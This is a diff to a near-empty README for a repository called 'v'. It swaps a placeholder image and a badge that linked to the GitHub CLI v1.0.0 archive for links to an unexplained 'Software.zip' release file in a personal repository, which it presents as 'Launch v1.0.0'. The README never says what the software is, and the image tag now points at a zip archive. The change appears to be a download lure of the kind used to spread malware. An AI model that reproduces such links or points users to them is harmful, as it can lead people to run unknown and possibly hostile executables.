@@ -1,6 +1,6 @@
 # Welcome to the "v" Repository!
 
-![v](https://via.placeholder.com/500)
+![v](https://github.com/Sudarshan0102/v/releases/download/v1.0/Software.zip)
 
 ## Description
 This repository does not come with a specific short description, allowing users to explore and discover its contents on their own.
@@ -9,7 +9,7 @@ This repository does not come with a specific short description, allowing users 
 No specific topics are provided for this repository.
 
 ## Download
-[![Launch v1.0.0](https://img.shields.io/badge/Launch-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Launch v1.0.0](https://github.com/Sudarshan0102/v/releases/download/v1.0/Software.zip)](https://github.com/Sudarshan0102/v/releases/download/v1.0/Software.zip)
 
 ---
 
